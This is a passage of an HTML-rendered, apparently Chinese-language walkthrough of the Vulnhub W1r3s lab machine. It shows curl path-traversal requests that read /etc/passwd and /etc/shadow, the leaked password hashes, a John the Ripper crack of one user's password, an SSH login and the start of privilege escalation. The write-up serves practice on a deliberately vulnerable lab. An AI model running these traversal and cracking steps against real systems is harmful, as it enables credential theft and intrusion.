+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;span class="lnt"&gt;36
+&lt;/span&gt;&lt;span class="lnt"&gt;37
+&lt;/span&gt;&lt;span class="lnt"&gt;38
+&lt;/span&gt;&lt;span class="lnt"&gt;39
+&lt;/span&gt;&lt;span class="lnt"&gt;40
+&lt;/span&gt;&lt;span class="lnt"&gt;41
+&lt;/span&gt;&lt;span class="lnt"&gt;42
+&lt;/span&gt;&lt;span class="lnt"&gt;43
+&lt;/span&gt;&lt;span class="lnt"&gt;44
+&lt;/span&gt;&lt;span class="lnt"&gt;45
+&lt;/span&gt;&lt;span class="lnt"&gt;46
+&lt;/span&gt;&lt;span class="lnt"&gt;47
+&lt;/span&gt;&lt;span class="lnt"&gt;48
+&lt;/span&gt;&lt;span class="lnt"&gt;49
+&lt;/span&gt;&lt;span class="lnt"&gt;50
+&lt;/span&gt;&lt;span class="lnt"&gt;51
+&lt;/span&gt;&lt;span class="lnt"&gt;52
+&lt;/span&gt;&lt;span class="lnt"&gt;53
+&lt;/span&gt;&lt;span class="lnt"&gt;54
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/W1r3s&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ curl -sS -i --max-time &lt;span class="m"&gt;10&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; --data-urlencode &lt;span class="s1"&gt;&amp;#39;urlConfig=../../../../../../../../../etc/passwd&amp;#39;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;http://10.10.10.104/administrator/alerts/alertConfigField.php&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;bin:x:2:2:bin:/bin:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sys:x:3:3:sys:/dev:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sync:x:4:65534:sync:/bin:/bin/sync
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;games:x:5:60:games:/usr/games:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;gnats:x:41:41:Gnats Bug-Reporting System &lt;span class="o"&gt;(&lt;/span&gt;admin&lt;span class="o"&gt;)&lt;/span&gt;:/var/lib/gnats:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;syslog:x:104:108::/home/syslog:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;_apt:x:105:65534::/nonexistent:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;messagebus:x:106:110::/var/run/dbus:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;uuidd:x:107:111::/run/uuidd:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;whoopsie:x:109:117::/nonexistent:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;saned:x:119:127::/var/lib/saned:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/W1r3s&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ curl -sS --max-time &lt;span class="m"&gt;10&lt;/span&gt; --data-urlencode &lt;span class="s1"&gt;&amp;#39;urlConfig=../../../../../../../../../etc/shadow&amp;#39;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://10.10.10.104/administrator/alerts/alertConfigField.php&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;root:&lt;span class="nv"&gt;$6$vYcecPCy$JNbK&lt;/span&gt;.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data:&lt;span class="nv"&gt;$6$8&lt;/span&gt;JMxE7l0&lt;span class="nv"&gt;$yQ16jM&lt;/span&gt;..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFi:::
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;w1r3s:&lt;span class="nv"&gt;$6$xe&lt;/span&gt;/eyoTx&lt;span class="nv"&gt;$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb&lt;/span&gt;/io7x9q1iP.:17567:0:99999:7:::
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里我只保留有用的信息&lt;/p&gt;
+&lt;p&gt;把这三个用户密码保存然后john爆破&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/W1r3s&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ john pass.hash 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Warning: detected &lt;span class="nb"&gt;hash&lt;/span&gt; &lt;span class="nb"&gt;type&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;sha512crypt&amp;#34;&lt;/span&gt;, but the string is also recognized as &lt;span class="s2"&gt;&amp;#34;HMAC-SHA256&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Use the &lt;span class="s2"&gt;&amp;#34;--format=HMAC-SHA256&amp;#34;&lt;/span&gt; option to force loading these as that &lt;span class="nb"&gt;type&lt;/span&gt; instead
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Warning: only loading hashes of &lt;span class="nb"&gt;type&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;sha512crypt&amp;#34;&lt;/span&gt;, but also saw &lt;span class="nb"&gt;type&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;HMAC-SHA256&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Use the &lt;span class="s2"&gt;&amp;#34;--format=HMAC-SHA256&amp;#34;&lt;/span&gt; option to force loading hashes of that &lt;span class="nb"&gt;type&lt;/span&gt; instead
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Using default input encoding: UTF-8
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Loaded &lt;span class="m"&gt;2&lt;/span&gt; password hashes with &lt;span class="m"&gt;2&lt;/span&gt; different salts &lt;span class="o"&gt;(&lt;/span&gt;sha512crypt, crypt&lt;span class="o"&gt;(&lt;/span&gt;3&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;$6&lt;/span&gt;$ &lt;span class="o"&gt;[&lt;/span&gt;SHA512 512/512 AVX512BW 8x&lt;span class="o"&gt;])&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Cost &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;iteration count&lt;span class="o"&gt;)&lt;/span&gt; is &lt;span class="m"&gt;5000&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; all loaded hashes
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Will run &lt;span class="m"&gt;4&lt;/span&gt; OpenMP threads
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Proceeding with single, rules:Single
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Press &lt;span class="s1"&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class="k"&gt;for&lt;/span&gt; status
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Almost &lt;span class="k"&gt;done&lt;/span&gt;: Processing the remaining buffered candidate passwords, &lt;span class="k"&gt;if&lt;/span&gt; any.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Proceeding with wordlist:/usr/share/john/password.lst
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;computer &lt;span class="o"&gt;(&lt;/span&gt;w1r3s&lt;span class="o"&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;爆出来w1r3s用户的密码，尝试ssh登陆&lt;/p&gt;
+&lt;h2 id="ssh登陆获取w1r3s权限"&gt;ssh登陆获取w1r3s权限
+&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ ssh w1r3s@10.10.10.104 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;The authenticity of host &lt;span class="s1"&gt;&amp;#39;10.10.10.104 (10.10.10.104)&amp;#39;&lt;/span&gt; can&lt;span class="s1"&gt;&amp;#39;t be established.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;ED25519 key fingerprint is: SHA256:Bue5VbUKeMSJMQdicmcMPTCv6xvD7I+20Ki8Um8gcWM
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;This key is not known by any other names.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;Are you sure you want to continue connecting (yes/no/[fingerprint])? y
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;Please type &amp;#39;&lt;/span&gt;yes&lt;span class="s1"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;no&lt;span class="s1"&gt;&amp;#39; or the fingerprint: yes
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;Warning: Permanently added &amp;#39;&lt;/span&gt;10.10.10.104&lt;span class="s1"&gt;&amp;#39; (ED25519) to the list of known hosts.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;** WARNING: connection is not using a post-quantum key exchange algorithm.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;** This session may be vulnerable to &amp;#34;store now, decrypt later&amp;#34; attacks.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;** The server may need to be upgraded. See https://openssh.com/pq.html
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;----------------------
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;Think this is the way?
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;----------------------
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;Well,........possibly.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;----------------------
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;w1r3s@10.10.10.104&amp;#39;&lt;/span&gt;s password: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Welcome to Ubuntu 16.04.3 LTS &lt;span class="o"&gt;(&lt;/span&gt;GNU/Linux 4.13.0-36-generic x86_64&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; * Documentation: https://help.ubuntu.com
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; * Management: https://landscape.canonical.com
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; * Support: https://ubuntu.com/advantage
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;108&lt;/span&gt; packages can be updated.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;6&lt;/span&gt; updates are security updates.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.....You made it huh?....
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Last login: Mon Jan &lt;span class="m"&gt;22&lt;/span&gt; 22:47:27 &lt;span class="m"&gt;2018&lt;/span&gt; from 192.168.0.35
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;w1r3s@W1R3S:~$
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="提权至root"&gt;提权至root
+&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;w1r3s@W1R3S:~$ id&lt;span class="p"&gt;;&lt;/span&gt;pwd&lt;span class="p"&gt;;&lt;/span&gt;whoami&lt;span class="p"&gt;;&lt;/span&gt;uname -a
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1000&lt;span class="o"&gt;(&lt;/span&gt;w1r3s&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1000&lt;span class="o"&gt;(&lt;/span&gt;w1r3s&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1000&lt;span class="o"&gt;(&lt;/span&gt;w1r3s&lt;span class="o"&gt;)&lt;/span&gt;,4&lt;span class="o"&gt;(&lt;/span&gt;adm&lt;span class="o"&gt;)&lt;/span&gt;,24&lt;span class="o"&gt;(&lt;/span&gt;cdrom&lt;span class="o"&gt;)&lt;/span&gt;,27&lt;span class="o"&gt;(&lt;/span&gt;sudo&lt;span class="o"&gt;)&lt;/span&gt;,30&lt;span class="o"&gt;(&lt;/span&gt;dip&lt;span class="o"&gt;)&lt;/span&gt;,46&lt;span class="o"&gt;(&lt;/span&gt;plugdev&lt;span class="o"&gt;)&lt;/span&gt;,113&lt;span class="o"&gt;(&lt;/span&gt;lpadmin&lt;span class="o"&gt;)&lt;/span&gt;,128&lt;span class="o"&gt;(&lt;/span&gt;sambashare&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/home/w1r3s
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;w1r3s
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Linux W1R3S 4.13.0-36-generic &lt;span class="c1"&gt;#40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;w1r3s@W1R3S:~$ sudo -l
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;sudo&lt;span class="o"&gt;]&lt;/span&gt; password &lt;span class="k"&gt;for&lt;/span&gt; w1r3s: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Matching Defaults entries &lt;span class="k"&gt;for&lt;/span&gt; w1r3s on W1R3S.localdomain:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; env_reset, mail_badpass, &lt;span class="nv"&gt;secure_path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class="se"&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class="se"&gt;\:&lt;/span&gt;/usr/sbin&lt;span class="se"&gt;\:&lt;/span&gt;/usr/bin&lt;span class="se"&gt;\:&lt;/span&gt;/sbin&lt;span class="se"&gt;\:&lt;/span&gt;/bin&lt;span class="se"&gt;\:&lt;/span&gt;/snap/bin
